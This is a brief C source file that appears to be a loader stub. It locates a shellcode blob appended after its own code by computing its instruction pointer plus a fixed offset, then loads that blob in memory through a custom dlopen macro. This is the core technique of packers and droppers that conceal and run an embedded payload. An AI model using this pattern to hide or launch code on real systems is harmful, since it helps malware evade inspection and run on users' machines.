#define __PRINT
#include "common/common.h"
#include "load-elf/loadelf.c"

static char *fake =  "Global variable\n";

#define SELF_LENGTH 6756
#define EXTRA_LENGTH 15112

int start() {
  long rip = get_rip() - 8; // func header
  long padding_shellcode_ptr = rip + SELF_LENGTH; // get shellcode location
  MY_DLOPEN(padding_shellcode_ptr, EXTRA_LENGTH); // load the shellcode
  return 1; // This will never be reached due to exit in start()
}